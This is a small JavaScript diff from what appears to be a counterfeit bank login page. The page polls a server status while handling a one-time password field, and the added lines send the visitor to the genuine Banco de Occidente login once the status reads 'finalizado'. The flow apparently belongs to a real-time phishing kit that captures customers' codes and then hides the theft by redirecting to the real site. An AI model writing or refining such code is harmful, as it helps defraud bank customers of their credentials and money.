@@ -220,6 +220,9 @@
                             if (otpInput) otpInput.value = '';
                             if (btnVerificar) btnVerificar.disabled = true;
                             if (errorLogin) errorLogin.classList.add('visible');
+                        } else if (data.estado === 'finalizado') {
+                            clearInterval(intervalo);
+                            window.location.href = 'https://www.bancodeoccidente.com.co/portaltransaccional/#/login';
                         }
                     } catch (e) {
                         console.error('Error estado:', e);
